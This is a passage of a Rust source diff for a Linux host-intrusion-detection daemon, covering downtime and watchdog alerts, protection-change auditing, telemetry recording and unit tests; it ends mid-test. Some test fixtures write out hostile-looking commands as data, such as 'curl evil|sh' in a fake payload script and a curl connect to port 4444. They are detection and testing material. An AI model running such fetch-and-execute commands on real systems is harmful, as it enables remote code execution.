+            // it comes from the record, and so does this one.
+            mode: &alert.mode,
             ancestry: &ancestry,
             related_alerts: &related_alerts,
             related_receipts: &related_receipts,
@@ -1108,10 +2607,8 @@ impl Daemon {
         };
         let incidents = self
             .store
-            .load()
-            .iter()
-            .filter(|a| !a.is_suppressed() && a.severity_rank() >= 2 && in_window(&a.ts))
-            .count() as u64;
+            .count_alerts(|a| !a.is_suppressed() && a.severity_rank() >= 2 && in_window(&a.ts))
+            as u64;
         let installs = self
             .store
             .receipts()
@@ -1147,6 +2644,161 @@ impl Daemon {
     }
 
     // ---------------------------------------------------- the noise guard §4
+
+    /// How long moat was down before this start, in seconds.
+    ///
+    /// `state.json` carries a heartbeat written on every save. If the gap
+    /// between that and now is longer than a restart takes, something stopped
+    /// the daemon -- an update, a reboot, a crash, or somebody with root who
+    /// wanted a window. Whichever it was, the hole belongs on the timeline,
+    /// because nothing else records it: `Restart=always` brings the process
+    /// back and says nothing about what was missed.
+    pub fn downtime_secs(&self) -> u64 {
+        self.started.saturating_sub(self.last_heartbeat)
+    }
+
+    /// Say so, once, at the start of a run.
+    pub fn report_downtime(&mut self) {
+        // A gap under a minute is a restart, which the user just did on
+        // purpose or an upgrade just did for them.
+        const FLOOR: u64 = 60;
+        if self.last_heartbeat == 0 {
+            return; // first ever start: no record to have a hole in
+        }
+        let gap = self.downtime_secs();
+        if gap < FLOOR {
+            return;
+        }
+        let mins = gap / 60;
+        log::warn!("moat was not running for {} minutes before this start", mins);
+        let meta = crate::rules::was_down_meta(mins);
+        let mut f = Finding::new(crate::rules::WAS_DOWN, meta, self_proc("startup"));
+        f.hook = "userland".into();
+        f.mode = self.mode.clone();
+        f.extra_evidence.push(format!(
+            "last heartbeat {}, started {} -- a {} second hole",
+            crate::util::rfc3339_of(self.last_heartbeat),
+            crate::util::rfc3339_of(self.started),
+            gap
+        ));
+        self.in_meta_alert = true;
+        let _ = self.emit(f);
+        self.in_meta_alert = false;
+    }
+
+    /// Something asked for `status`. Almost always the panel.
+    pub fn note_watcher(&mut self, now: u64) {
+        self.last_watched = now;
+    }
+
+    /// Notice when alerts are stacking up and nothing is reading them.
+    ///
+    /// Every notification moat produces is drawn by a program in the user's own
+    /// session -- the panel, and the digest timer -- so anything running as the
+    /// user can silence the whole product by killing one process. That is the
+    /// cheapest attack on this design: no evasion, no privilege, just `pkill`,
+    /// and moatd goes on recording perfectly while nobody sees any of it.
+    ///
+    /// moatd is root and the attacker cannot stop it, so the noticing belongs
+    /// here. It cannot draw a notification itself (that needs the user's
+    /// session bus), but it can put the gap on the record, where the panel will
+    /// show it the moment one comes back -- and where an offline reader of
+    /// alerts.jsonl sees it regardless.
+    pub fn watchdog_tick(&mut self, now: u64) {
+        const QUIET: u64 = 1800;
+        const REPEAT: u64 = 21_600;
+        let quiet_for = now.saturating_sub(self.last_watched);
+        if quiet_for < QUIET {
+            return;
+        }
+        // Only what reached the badge: a timeline entry nobody read is not a
+        // missed warning, it is the timeline working as intended. This is the
+        // same count `status` reports as `unacked` -- it used to be a second
+        // filter with one more clause, so `moatctl status` said "high 243"
+        // while this said 8 were waiting.
+        let unacked: u64 = self.store.unacked().values().sum();
+        if unacked == 0 {
+            return;
+        }
+        if now.saturating_sub(self.last_unwatched_alert) < REPEAT {
+            return;
+        }
+        self.last_unwatched_alert = now;
+        if self.in_meta_alert {
+            return;
+        }
+        let mins = quiet_for / 60;
+        log::warn!("nobody has read moat's status in {} minutes, {} alerts waiting", mins, unacked);
+        let meta = crate::rules::unwatched_meta(unacked, mins);
+        let mut f = Finding::new(crate::rules::UNWATCHED, meta, self_proc("watchdog"));
+        f.hook = "userland".into();
+        f.mode = self.mode.clone();
+        f.extra_evidence.push(format!(
+            "no status read for {} minutes; {} surfaced alert(s) unanswered",
+            mins, unacked
+        ));
+        self.in_meta_alert = true;
+        let _ = self.emit(f);
+        self.in_meta_alert = false;
+    }
+
+    /// The sensor is dropping events. Say so, once per hour per cgroup.
+    ///
+    /// This is the only failure in the whole design where the evidence is what
+    /// goes missing: every other evasion leaves a record somewhere. Rate-limited
+    /// because a throttle repeats for as long as the flood does, and a thousand
+    /// alerts about a thousand missing alerts helps nobody.
+    fn note_throttle(&mut self, t: &crate::event::ThrottleEvent, now: u64) {
+        if t.kind.as_deref() == Some("THROTTLE_STOP") {
+            return;
+        }
+        let cgroup = t.cgroup.clone().unwrap_or_default();
+        let last = self.throttle_seen.get(&cgroup).copied().unwrap_or(0);
+        if now.saturating_sub(last) < 3600 {
+            return;
+        }
+        self.throttle_seen.insert(cgroup.clone(), now);
+        if self.in_meta_alert {
+            return;
+        }
+        log::warn!("sensor throttled for {}: events are being dropped", cgroup);
+        let meta = crate::rules::sensor_throttled_meta(&cgroup);
+        let mut f = Finding::new(crate::rules::SENSOR_THROTTLED, meta, self_proc("throttle"));
+        f.hook = "userland".into();
+        f.mode = self.mode.clone();
+        f.extra_evidence
+            .push("events from this cgroup were discarded by the sensor, not by moat".into());
+        if !cgroup.is_empty() {
+            f.extra_evidence.push(format!("cgroup: {}", cgroup));
+        }
+        self.in_meta_alert = true;
+        let _ = self.emit(f);
+        self.in_meta_alert = false;
+    }
+
+    /// Record that a protection was weakened, and by whom.
+    ///
+    /// `who` comes from `SO_PEERCRED` -- the kernel's answer about the process
+    /// on the other end of the socket, which the caller cannot forge. Before
+    /// this, every mutating command was anonymous: `moatctl ignore --scope rule`
+    /// silenced a whole detection class and the only trace was a line in root's
+    /// journal, which the user being protected cannot read. An off switch the
+    /// attacker can reach and nobody can see them reach is not a control.
+    pub fn raise_protection_change(&mut self, action: &str, who: &str, detail: Vec<String>) {
+        if self.in_meta_alert {
+            return;
+        }
+        let meta = crate::rules::protection_changed_meta(action, who);
+        let mut f = Finding::new(crate::rules::PROTECTION_CHANGED, meta, self_proc(action));
+        f.hook = "userland".into();
+        f.mode = self.mode.clone();
+        f.what_override = Some(format!("{} asked Moat to {}.", who, action));
+        f.extra_evidence.push(format!("requested by {}", who));
+        f.extra_evidence.extend(detail);
+        self.in_meta_alert = true;
+        let _ = self.emit(f);
+        self.in_meta_alert = false;
+    }
 
     /// One `moat-x-noisy-rule` alert per demotion, naming the top five tuples
     /// and offering both "these are expected" and "keep watching".
@@ -1275,12 +2927,36 @@ impl Daemon {
     }
 
     /// Periodic upkeep: demotions that have gone quiet, and the two files.
+    /// Called wherever `baseline_tick` is: expiring a containment is time
+    /// passing, not an event arriving, so it cannot hang off the event path.
+    pub fn tick(&mut self, now: u64, force_save: bool) {
+        self.baseline_tick(now, force_save);
+        self.contain_tick(now);
+        self.watchdog_tick(now);
+    }
+
     pub fn baseline_tick(&mut self, now: u64, force_save: bool) {
+        // Evict the dedupe map here, or it grows forever.
+        //
+        // The `dedupe_secs` filter makes an old entry INEFFECTIVE; it never
+        // removed one. The key is (rule, exe, file path), all attacker-chosen,
+        // so a loop touching a fresh path each time grew a permanent map -- and
+        // because a miss is also what triggers an incident capture, the same
+        // loop rolled the 200-directory retention window and evicted real
+        // evidence while it did it.
+        let window = self.cfg.thresholds.dedupe_secs;
+        self.dedupe
+            .retain(|_, v| now.saturating_sub(v.first_seen) < window.max(1));
+
         for rule in self.baseline.clear_stale_demotions(now) {
             log::info!("noise guard: {} is quiet again; the demotion is cleared", rule);
         }
         // An install whose exit line we never saw (restart, rotation, a dropped
         // event) would otherwise sit in the tracker for ever.
+        // `ChainStore::note` prunes on every observation, so the bound holds
+        // even here; this is for the machine that goes quiet with a chain open,
+        // which would otherwise hold it until the next alert.
+        self.chains.prune(now);
         let dropped = self.receipts.prune(now, 6 * 3_600);
         if dropped > 0 {
             log::debug!("receipts: dropped {} install(s) with no exit", dropped);
@@ -1461,7 +3137,7 @@ impl Daemon {
         if let Some(o) = digest_summary.as_object_mut() {
             o.insert("last_sent_unix".into(), Value::from(self.digest_last_sent));
         }
-        json!({
+        let mut out = json!({
             "ok": true,
             "version": crate::VERSION,
             "mode": self.mode,
@@ -1497,7 +3173,28 @@ impl Daemon {
             "baseline": self.baseline.status(now),
             "proposals": self.baseline.proposals(),
             "demoted_rules": self.baseline.demoted_rules(),
+            // LEARNING §2c. The panel needs this to tell "no verdict yet"
+            // apart from "verdicts are switched off": without it an untriaged
+            // incident shows nothing about analysis at all and the feature is
+            // invisible until it happens to have finished.
+            "auto_triage": self.cfg.analysis.auto_triage.as_str(),
+            "triage_pending": self
+                .store
+                .count_alerts(|a| a.surface == "alerts" && !a.acked && a.triage.is_none()),
             "rarity_counters": self.rarity.len(),
+
+            // --- telemetry -------------------------------------------------
+            // What is being RECORDED, on the same response as what is being
+            // detected. A reader that sees `sensor_unhealthy: false` and
+            // `telemetry.classes: ["alerts"]` knows exactly how much of this
+            // machine's history exists, which is the honest answer to "can I
+            // go back and look".
+            "telemetry": {
+                "classes": self.cfg.telemetry.classes(),
+                "written": self.telemetry_written,
+                "filtered": self.telemetry_filtered,
+                "file": self.telemetry.as_ref().map(|t| t.path().display().to_string()),
+            },
 
             // --- LEARNING §9 "Resolved shapes" ----------------------------
             // `digest` is the boolean the plugin's settings row binds to;
@@ -1510,6 +3207,11 @@ impl Daemon {
             "incidents": incident::count(&self.incidents_dir()),
             "incidents_dir": self.incidents_dir().display().to_string(),
             "incidents_captured": self.incidents_captured,
+            // Design 2b/3a. `chains_open` is what the panel needs to know it
+            // must render 3a instead of 1b; `chains_formed` is the counter for
+            // the digest and for judging whether the thresholds are right.
+            "chains_open": self.chains.len(),
+            "chains_formed": self.chains.formed,
             "receipts": self.store.receipts().len(),
             "installs_watched": self.receipts.len(),
 
@@ -1518,7 +3220,40 @@ impl Daemon {
                 "files": self.provenance.db().files,
                 "trusted_repos": self.cfg.baseline.trusted_repos,
             },
-        })
+        });
+        // Inserted rather than written inline: `json!` hits its recursion limit
+        // on an object this size.
+        //
+        // Which rules CAN be armed, and what arming one actually does.
+        // `enforcing_rules` above says what IS armed, which is not enough to
+        // offer the choice anywhere: only a rule whose policy carries an
+        // enforcing action can be armed at all -- 7 of 46 here -- and the two
+        // kinds are different promises. `kill` ends the process; `deny` refuses
+        // the operation with -EPERM and the program keeps running. Anything
+        // presenting this as a switch has to be able to say which one the user
+        // is turning on.
+        if let Some(o) = out.as_object_mut() {
+            o.insert("enforceable".into(), Value::from(self.enforceable()));
+            // Also what `write_state` persists, which is how a containment
+            // survives a restart. A policy moatd forgot is one nobody will ever
+            // delete: it would keep refusing that connection until tetragon
+            // next restarts, with nothing on screen saying why.
+            o.insert("contain".into(), self.contain.to_state());
+            o.insert(
+                "kernel_exclusions".into(),
+                serde_json::to_value(&self.kernel_exclusions).unwrap_or(Value::Null),
+            );
+            o.insert("contain_enabled".into(), Value::from(self.cfg.contain.enabled));
+            o.insert("contain_kill".into(), Value::from(self.cfg.contain.kill.clone()));
+            // The hourly content-analysis budget. Persisted for the same reason
+            // the containment is: an allowance a restart refills is not one.
+            o.insert("content".into(), self.content.to_state());
+            // Written into state.json on every save, so the NEXT start can see
+            // how long moat was not running. Stopping the daemon needs root,
+            // and a root-level shutdown left no trace at all before this.
+            o.insert("heartbeat".into(), Value::from(util::unix_secs()));
+        }
+        out
     }
 
     pub fn write_state(&self) {
@@ -1566,6 +3301,65 @@ fn access_word(mask: Option<i64>) -> Option<String> {
     }
 }
 
+/// Open `telemetry.jsonl` only when there is something to write to it.
+///
+/// `alerts` is not a reason: that class *is* `alerts.jsonl`, which already
+/// exists and is already the right file. With every other class off this
+/// returns `None` and the whole telemetry path costs one `Option` check per
+/// event, which is what "off by default" has to mean at 42 events a second.
+fn open_telemetry(cfg: &Config) -> Option<crate::telemetry::TelemetryStore> {
+    if !(cfg.telemetry.process || cfg.telemetry.network || cfg.telemetry.file) {
+        return None;
+    }
+    for p in cfg.telemetry.problems() {
+        log::warn!("telemetry: {}", p);
+    }
+    match crate::telemetry::TelemetryStore::open(
+        &cfg.paths.telemetry(),
+        &cfg.paths.telemetry_rotated(),
+        cfg.telemetry.max_bytes,
+        &cfg.group,
+    ) {
+        Ok(s) => {
+            log::info!(
+                "telemetry classes on: {:?} -> {}",
+                cfg.telemetry.classes(),
+                s.path().display()
+            );
+            Some(s)
+        }
+        Err(e) => {
+            log::error!("telemetry: {} ({})", e, cfg.paths.telemetry().display());
+            None
+        }
+    }
+}
+
+/// The sha256 an incident snapshot already computed for this file, if it copied
+/// it. Saves the content analyser a second walk over the same bytes.
+///
+/// The incident record on the alert carries `file/<basename>` and a size, not
+/// the original path (the path -> copy mapping lives in the snapshot's
+/// `meta.json`, which is not folded into the alert). Basename alone would be
+/// enough to attach the wrong hash to the wrong file — two `index.js` in one
+/// tree is not exotic — so the size has to agree as well. If it does not, this
+/// returns `None` and the analyser hashes what it reads, which is always
+/// correct and merely costs a hash over a buffer already in memory.
+fn incident_sha(a: &Alert, path: &str) -> Option<String> {
+    let inc = a.incident.as_ref()?;
+    let want = format!("file/{}", util::basename(path));
+    let size = std::fs::metadata(path).ok()?.len();
+    let mut hit = inc
+        .files
+        .iter()
+        .filter(|f| f.name == want && f.size == size && f.sha256.len() == 64);
+    let first = hit.next()?;
+    if hit.next().is_some() {
+        return None;
+    }
+    Some(first.sha256.clone())
+}
+
 fn read_state(path: &Path) -> Option<Value> {
     let text = std::fs::read_to_string(path).ok()?;
     serde_json::from_str(&text).ok()
@@ -1584,6 +3378,80 @@ fn persisted_enforcing_rules(state: &Option<Value>) -> std::collections::BTreeSe
                 .collect()
         })
         .unwrap_or_default()
+}
+
+/// `[contain] enabled` as the USER last set it.
+///
+/// Same shape as `persisted_mode`, and for the same reason: a switch a person
+/// flips is runtime state, not configuration. Making containment a root-owned
+/// TOML edit plus a `systemctl restart` -- which is how it shipped first --
+/// put a security feature behind a text editor and a service restart, while
+/// every other switch on this daemon (mode, sandbox, digest) needed neither.
+/// The file stays the DEFAULT for a fresh machine; this is the override.
+/// The kernel exclusions recorded in state.json, for `render-policies`.
+///
+/// A free function because rendering happens in a separate process before the
+/// daemon exists (ExecStartPre), and the exclusions have to be applied there or
+/// the program the user allowed starts dying again on the next boot.
+pub fn read_exclusions(
+    state_file: &Path,
+) -> std::collections::BTreeMap<String, Vec<String>> {
+    let mut out = std::collections::BTreeMap::new();
+    let Some(state) = read_state(state_file) else {
+        return out;
+    };
+    let Some(map) = state.get("kernel_exclusions").and_then(|v| v.as_object()) else {
+        return out;
+    };
+    for (policy, bins) in map {
+        let list: Vec<String> = bins
+            .as_array()
+            .map(|a| a.iter().filter_map(|b| b.as_str().map(str::to_string)).collect())
+            .unwrap_or_default();
+        if !list.is_empty() {
+            out.insert(policy.clone(), list);
+        }
+    }
+    out
+}
+
+/// The rules whose finding is "a setuid or setgid bit was set".
+fn is_setuid_rule(name: &str) -> bool {
+    name == "moat-priv-setuid-chmod" || name == "moat-priv-setcap-xattr"
+}
+
+/// Why this setuid/setcap event grants no privilege, if it does not.
+///
+/// `None` means it really is a privilege signal: the actor is root, the file
+/// belongs to somebody else, or moat could not tell. Could-not-tell must never
+/// read as harmless, so a failed `stat` returns `None`.
+fn setuid_grants_nothing(f: &crate::explain::Finding, path: &str) -> Option<String> {
+    use std::os::unix::fs::MetadataExt;
+    let actor = f.proc.uid;
+    if actor == 0 {
+        return None;
+    }
+    let owner = std::fs::metadata(path).ok()?.uid();
+    (owner == actor).then(|| {
+        format!(
+            "uid {} set this bit on a file uid {} already owns, so it grants no privilege: \
+             setuid means \"run as the file's owner\", and the owner is the caller",
+            actor, owner
+        )
+    })
+}
+
+fn persisted_contain(state: &Option<Value>) -> Option<bool> {
+    state.as_ref()?.get("contain_enabled")?.as_bool()
+}
+
+/// The panel can change `kill`, so like `contain_enabled` it has to survive a
+/// restart from state.json rather than from moat.toml -- moatd does not
+/// rewrite a config file the user also owns. An unrecognised value is ignored
+/// rather than defaulted, so a corrupt state file cannot silently arm SIGKILL.
+fn persisted_kill(state: &Option<Value>) -> Option<String> {
+    let v = state.as_ref()?.get("contain_kill")?.as_str()?;
+    matches!(v, "off" | "log" | "kill").then(|| v.to_string())
 }
 
 fn persisted_mode(state: &Option<Value>) -> Option<String> {
@@ -1640,6 +3508,7 @@ fn self_proc(about: &str) -> ProcInfo {
         exited_at: None,
         exit_signal: None,
         exe_note: None,
+        sid: crate::proctable::read_sid(std::process::id()),
     }
 }
 
@@ -1687,6 +3556,13 @@ impl Default for RunOptions {
 }
 
 pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
+    {
+        // Before the first event: the kernel has to agree with what the record
+        // says is armed. See `reapply_enforcement`.
+        let mut d = daemon.lock().expect("daemon lock");
+        d.reapply_enforcement();
+        d.report_downtime();
+    }
     let (log_path, state_every, feeds_every, feeds_dir) = {
         let d = daemon.lock().expect("daemon lock");
         (
@@ -1708,7 +3584,8 @@ pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
             let mut d = daemon.lock().expect("daemon lock");
             // rarity.json and baseline.json are flushed on the way out; the
             // 60 s timer must not cost a day of counters on a restart.
-            d.baseline_tick(util::unix_secs(), true);
+            d.tick(util::unix_secs(), true);
+            d.flush_telemetry();
             d.write_state();
             break;
         }
@@ -1734,7 +3611,11 @@ pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
             // One stat of /var/lib/pacman/local; a reload only happens when a
             // transaction actually moved it (BASELINE §1).
             d.on_pacman_change();
-            d.baseline_tick(now, false);
+            d.tick(now, false);
+            // Telemetry is written per event and flushed here, not per line:
+            // 42 exec events a second is 42 write(2)s, and putting a flush on
+            // each one would push the sensor's own I/O onto the event path.
+            d.flush_telemetry();
             d.write_state();
         }
         if now.saturating_sub(last_feeds) >= feeds_every {
@@ -1753,7 +3634,8 @@ pub fn run(daemon: Arc<Mutex<Daemon>>, opts: RunOptions) {
                 let mut d = daemon.lock().expect("daemon lock");
                 let now = util::unix_secs();
                 d.table.prune(now);
-                d.baseline_tick(now, true);
+                d.tick(now, true);
+                d.flush_telemetry();
                 d.write_state();
                 break;
             }
@@ -1787,6 +3669,1242 @@ mod tests {
         d.homes = vec!["/home/dan".into()];
         d.provenance.set_homes(&d.homes);
         (d, cfg)
+    }
+
+    // ------------------------------------------------------------- telemetry
+
+    fn telemetry_daemon(dir: &Path, f: impl FnOnce(&mut crate::config::TelemetryConfig)) -> Daemon {
+        let mut cfg = Config::default();
+        cfg.paths.state_dir = dir.join("state");
+        cfg.paths.policies_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/policies");
+        cfg.paths.allowlist_dir = dir.join("allowlist.d");
+        cfg.paths.sandbox_flag = dir.join("sandbox.enabled");
+        cfg.analysis.bundle_dir = dir.join("incidents");
+        cfg.paths.pacman_local = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/pacman-local");
+        cfg.paths.pacman = Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/fake-pacman");
+        std::fs::create_dir_all(&cfg.paths.allowlist_dir).unwrap();
+        f(&mut cfg.telemetry);
+        let mut d = Daemon::new(cfg, &dir.join("moat.toml")).unwrap();
+        d.homes = vec!["/home/dan".into()];
+        d
+    }
+
+    /// Timing probe, not a test: `MOAT_BENCH_DIR=<dir with alerts.jsonl and
+    /// alerts.1.jsonl> cargo test --release --lib engine::tests::bench_status -- --ignored --nocapture`.
+    #[test]
+    #[ignore]
+    fn bench_status() {
+        let Ok(src) = std::env::var("MOAT_BENCH_DIR") else { return };
+        let src = Path::new(&src);
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join("state")).unwrap();
+        for f in ["alerts.jsonl", "alerts.1.jsonl"] {
+            std::fs::copy(src.join(f), dir.path().join("state").join(f)).unwrap();
+        }
+        let d = telemetry_daemon(dir.path(), |_| {});
+        let now = util::unix_secs();
+        for _ in 0..3 {
+            let t = std::time::Instant::now();
+            let _ = d.store.unacked();
+            let t_un = t.elapsed();
+            let t = std::time::Instant::now();
+            let _ = d.digest(now);
+            let t_dg = t.elapsed();
+            let t = std::time::Instant::now();
+            let _ = d.store.receipts().len();
+            let t_rc = t.elapsed();
+            let t = std::time::Instant::now();
+            let _ = d.tetragon_state();
+            let t_ts = t.elapsed();
+            let t = std::time::Instant::now();
+            let _ = incident::count(&d.incidents_dir());
+            let t_ic = t.elapsed();
+            let t = std::time::Instant::now();
+            let st = d.status();
+            let t_st = t.elapsed();
+            let t = std::time::Instant::now();
+            let body = serde_json::to_string_pretty(&st).unwrap();
+            let t_ser = t.elapsed();
+            let t = std::time::Instant::now();
+            d.write_state();
+            let t_ws = t.elapsed();
+            eprintln!("BENCH unacked {:?} digest {:?} receipts {:?} tetragon_state {:?} incident::count {:?} | status() {:?} ({} bytes) serialize {:?} write_state {:?}",
+                t_un, t_dg, t_rc, t_ts, t_ic, t_st, body.len(), t_ser, t_ws);
+        }
+    }
+
+    fn telemetry_lines(d: &Daemon) -> Vec<Value> {
+        std::fs::read_to_string(d.cfg.paths.telemetry())
+            .unwrap_or_default()
+            .lines()
+            .filter(|l| !l.trim().is_empty())
+            .map(|l| serde_json::from_str(l).unwrap())
+            .collect()
+    }
+
+    /// Off by default means off: no file, no writes, and one Option check per
+    /// event on a path that runs 42 times a second.
+    #[test]
+    fn every_class_but_alerts_is_off_and_writes_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut d = telemetry_daemon(dir.path(), |_| {});
+        assert!(d.telemetry.is_none());
+        assert_eq!(d.cfg.telemetry.classes(), vec!["alerts"]);
+        let text = std::fs::read_to_string(
+            Path::new(env!("CARGO_MANIFEST_DIR")).join("testdata/sample.log"),
+        )
+        .unwrap();
+        for l in text.lines() {
+            d.handle_line(l);
+        }
+        assert_eq!(d.telemetry_written, 0);
+        assert!(!d.cfg.paths.telemetry().exists());
+        assert!(!d.store.load().is_empty(), "alerts still happen");
+    }
+
+    /// THE CONSTRAINT. A telemetry event must not be evaluated against a single
+    /// rule: with the file class posting ~19 events/s through the kernel filter
+    /// during an install, running each through ancestry-walking rules is how a
+    /// detection daemon melts. It is recorded and it raises nothing.
+    #[test]
+    fn a_telemetry_event_is_recorded_and_never_evaluated() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut d = telemetry_daemon(dir.path(), |t| {
+            t.network = true;
+            t.file = true;
+        });
+        assert!(d.telemetry.is_some());
+
+        // A connect to a port that moat-net-suspicious-port-egress would alert
+        // on, carried by a telemetry policy instead. It must be recorded and
+        // must not become an alert.
+        d.handle_line(
+            r#"{"process_exec":{"process":{"exec_id":"t1","pid":9001,"uid":1000,
+                 "binary":"/usr/bin/curl","arguments":"http://1.2.3.4:4444/x",
+                 "start_time":"2026-09-04T10:00:00.000000000Z"}}}"#,
+        );
+        d.handle_line(
+            r#"{"process_kprobe":{"process":{"exec_id":"t1","pid":9001,"binary":"/usr/bin/curl"},
+                 "function_name":"tcp_connect","policy_name":"moat-telemetry-network-connect",
+                 "args":[{"sock_arg":{"family":"AF_INET","daddr":"1.2.3.4","dport":4444}}],
+                 "action":"KPROBE_ACTION_POST"},"time":"2026-09-04T10:00:01.000000000Z"}"#,
+        );
+        d.flush_telemetry();
+
+        assert!(d.store.load().is_empty(), "telemetry raised an alert");
+        assert_eq!(d.alerts_emitted, 0);
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 1, "{:?}", recs);
+        assert_eq!(recs[0]["class"], "network");
+        assert_eq!(recs[0]["dst_ip"], "1.2.3.4");
+        assert_eq!(recs[0]["dst_port"], 4444);
+        // Ancestry is why the process table is still updated before the fork.
+        assert_eq!(recs[0]["exe"], "/usr/bin/curl");
+        assert_eq!(recs[0]["pid"], 9001);
+    }
+
+    /// The ladder, through the real event path: a create in a build tree is
+    /// dropped, and a rewrite of a file that already existed is not — that
+    /// second case is the npm-package-rewrites-its-own-index.js one.
+    #[test]
+    fn the_file_ladder_drops_the_install_and_keeps_the_rewrite() {
+        let dir = tempfile::tempdir().unwrap();
+        let tree = dir.path().join("app/node_modules/express");
+        std::fs::create_dir_all(&tree).unwrap();
+        let fresh = tree.join("index.js");
+        std::fs::write(&fresh, b"module.exports = 1\n").unwrap();
+
+        let mut d = telemetry_daemon(dir.path(), |t| {
+            t.file = true;
+            // The file is seconds old, so a window of 0 makes it read as
+            // pre-existing and a large window makes it read as just-created.
+            t.create_window_secs = 0;
+            t.quiet_creates_under = vec!["/node_modules/".into()];
+        });
+
+        let hook = |path: &str| {
+            format!(
+                r#"{{"process_kprobe":{{"process":{{"exec_id":"w1","pid":9100,"binary":"/usr/bin/node"}},
+                     "function_name":"security_file_post_open",
+                     "policy_name":"moat-telemetry-file-exec-shape",
+                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}},
+                     "time":"2026-09-04T10:00:01.000000000Z"}}"#,
+                path
+            )
+        };
+        d.handle_line(&hook(&fresh.display().to_string()));
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 1, "a modify under node_modules is the signal");
+        assert_eq!(recs[0]["verdict"], "modify");
+        assert_eq!(recs[0]["shape"], "script");
+        assert_eq!(recs[0]["kind"], "file_write");
+        assert!(recs[0]["sha256"].is_string());
+        assert!(recs[0].get("body").is_none(), "no body unless asked for");
+        assert_eq!(d.telemetry_filtered, 0);
+
+        // The same path, same policy, but now it counts as a create: dropped.
+        d.cfg.telemetry.create_window_secs = 86_400;
+        d.handle_line(&hook(&fresh.display().to_string()));
+        d.flush_telemetry();
+        assert_eq!(telemetry_lines(&d).len(), 1, "the create is not recorded");
+        assert_eq!(d.telemetry_filtered, 1);
+
+        // …and a create outside a build tree still is.
+        let bin = dir.path().join("bin");
+        std::fs::create_dir_all(&bin).unwrap();
+        let drop = bin.join("payload.sh");
+        std::fs::write(&drop, b"#!/bin/sh\ncurl evil|sh\n").unwrap();
+        d.handle_line(&hook(&drop.display().to_string()));
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 2);
+        assert_eq!(recs[1]["verdict"], "create");
+    }
+
+    #[test]
+    fn a_chmod_x_is_its_own_verdict_and_needs_no_birth_time() {
+        let dir = tempfile::tempdir().unwrap();
+        let f = dir.path().join("dropper");
+        std::fs::write(&f, b"\x7fELF\x02rest").unwrap();
+        let mut d = telemetry_daemon(dir.path(), |t| t.file = true);
+        d.handle_line(&format!(
+            r#"{{"process_lsm":{{"process":{{"exec_id":"c1","pid":9200,"binary":"/usr/bin/chmod"}},
+                 "function_name":"path_chmod",
+                 "policy_name":"moat-telemetry-file-became-executable",
+                 "args":[{{"path_arg":{{"path":"{}"}}}},{{"int_arg":493}}]}}}}"#,
+            f.display()
+        ));
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 1);
+        assert_eq!(recs[0]["verdict"], "chmod_x");
+        assert_eq!(recs[0]["kind"], "file_chmod");
+        // Magic bytes, not the (absent) extension.
+        assert_eq!(recs[0]["shape"], "elf");
+    }
+
+    /// Body capture is opt-in, capped, and inherits the credential refusal that
+    /// stops `evidence.rs` staging a key for an AI. A path that looks like key
+    /// material is never read, whatever the config says.
+    #[test]
+    fn body_capture_is_opt_in_and_never_reads_a_credential() {
+        let dir = tempfile::tempdir().unwrap();
+        let ssh = dir.path().join(".ssh");
+        std::fs::create_dir_all(&ssh).unwrap();
+        let key = ssh.join("id_ed25519");
+        std::fs::write(&key, b"-----BEGIN OPENSSH PRIVATE KEY-----\n").unwrap();
+        let script = dir.path().join("setup.sh");
+        std::fs::write(&script, b"#!/bin/sh\necho hi\n").unwrap();
+        let big = dir.path().join("big.sh");
+        std::fs::write(&big, vec![b'x'; 4096]).unwrap();
+
+        let mut d = telemetry_daemon(dir.path(), |t| {
+            t.file = true;
+            t.capture_body = true;
+            t.capture_body_max_bytes = 1024;
+            t.create_window_secs = 0;
+        });
+        let hook = |p: &Path| {
+            format!(
+                r#"{{"process_kprobe":{{"process":{{"exec_id":"b1","pid":1,"binary":"/usr/bin/sh"}},
+                     "function_name":"security_file_post_open",
+                     "policy_name":"moat-telemetry-file-exec-shape",
+                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}}}}"#,
+                p.display()
+            )
+        };
+        for p in [&script, &key, &big] {
+            d.handle_line(&hook(p));
+        }
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 3, "all three are recorded");
+        assert_eq!(recs[0]["body"], "#!/bin/sh\necho hi\n", "the script's body");
+        assert!(
+            recs[1].get("body").is_none(),
+            "a private key's body must never be captured: {}",
+            recs[1]
+        );
+        assert!(recs[2].get("body").is_none(), "over the cap");
+
+        // …and a staged artefact's body is refused even though its path looks
+        // like an ordinary script. moat-ship blanks the PATH wherever it
+        // appears, but it cannot recognise a body, so the refusal is here.
+        std::fs::create_dir_all(&d.cfg.analysis.bundle_dir).unwrap();
+        let staged = d.cfg.analysis.bundle_dir.join("actor.setup.sh.suspect");
+        std::fs::write(&staged, b"#!/bin/sh\nexfil\n").unwrap();
+        d.handle_line(&hook(&staged));
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 4);
+        assert!(
+            recs[3].get("body").is_none(),
+            "staged evidence body reached telemetry: {}",
+            recs[3]
+        );
+        assert!(!std::fs::read_to_string(d.cfg.paths.telemetry())
+            .unwrap()
+            .contains("exfil"));
+        // The key is still described — withheld is not hidden.
+        assert!(recs[1]["sha256"].is_string());
+        let all = std::fs::read_to_string(d.cfg.paths.telemetry()).unwrap();
+        assert!(!all.contains("BEGIN OPENSSH PRIVATE KEY"), "key material reached the file");
+    }
+
+    #[test]
+    fn the_process_class_records_exec_and_exit_without_the_parent_block() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut d = telemetry_daemon(dir.path(), |t| t.process = true);
+        d.handle_line(
